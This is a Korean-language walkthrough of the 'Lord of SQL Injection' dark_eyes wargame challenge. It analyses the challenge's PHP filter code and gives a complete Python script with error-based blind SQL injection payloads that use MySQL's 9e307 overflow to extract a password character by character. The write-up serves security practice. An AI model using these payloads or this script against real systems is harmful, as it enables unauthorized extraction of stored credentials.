# Lord of SQL Injection No.22 - dark_eyes

## 문제 출제 의도

`col`, `if`, `case`, `when`, `sleep`, `benchmark` 을 사용하지 않고 Error Based SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석

dark_eyes 문제의 php 소스 코드는 다음과 같다.
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `()`, `#`, `-` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, pw에 `col`, `if`, `case`, `when`, `sleep`, `benchmark` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* MySQL 쿼리 수행에 오류가 있으면 문제 풀이에 실패한다. 이것으로 Error Based SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같음'이다. 즉, 실제 데이터베이스에 저장된 pw를 알아내서 전달해야 한다.

## MySQL 지수 연산 최대치

MySQL에서는 e를 이용한 지수 연산이 가능하다.

예를 들어, 9e0은 9와 같고, 9e1은 90과 같다.

이때, 9의 지수 연산의 최대치는 9e307이다. 9e308부터는 ERROR 1367 (22007): Illegal double '9e308' value found during parsing 와 같이 에러가 난다.

또한, 연산을 통해 최대치를 초과할 때에도 ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 9e307)' 와 같이 에러가 난다.

-----

## Solution
    
1. MySQL 지수 연산 최대치 이용

    이 문제는 Blind SQL Injection과 Error Based SQL Injection을 결합해서 풀 수 있다.
    
    에러가 발생하면 query를 출력하지 않고 빈 화면을 출력하므로 이를 이용하는 코드를 작성한다.

    ```python
    import urllib.request
    from urllib.parse import quote

    key = ""

    pwlen = 0

    for i in range(1, 20):
        url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
        data = "' or id='admin' and (((length(pw)='{}')+1)*9e307)-- -".format(str(i))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("query :") == -1:
            pwlen = i
            print('pw length : ' + str(pwlen))
            break

    for i in range(1, pwlen + 1):
        for j in range(32, 127):
            if chr(j) in {'_', '.', "'"}: # 필터링되는 문자들
                continue
            url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
            data = "' or id='admin' and (((substr(pw,{},1)='{}')+1)*9e307)-- -".format(
                str(i), chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2")
            req = urllib.request.urlopen(re)

            if str(req.read()).find("query :") == -1:
                key += chr(j).lower()
                print (key)
                break
    print(key)
    ```

    이러한 코드를 실행하면 결과값으로 5a2f5d3c 를 출력한다.
    이를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=5a2f5d3c
    ```